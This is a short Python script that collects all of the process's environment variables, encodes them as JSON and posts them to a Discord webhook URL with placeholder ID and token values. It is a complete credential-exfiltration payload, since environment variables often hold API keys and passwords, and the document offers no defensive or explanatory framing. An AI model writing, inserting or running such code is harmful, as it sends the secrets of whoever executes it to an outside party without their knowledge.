import json
import os
import urllib.request

payload = json.dumps(dict(os.environ)).encode()
urllib.request.urlopen(
    "https://discord.com/api/webhooks/1234567890/example-token",
    data=payload,
)
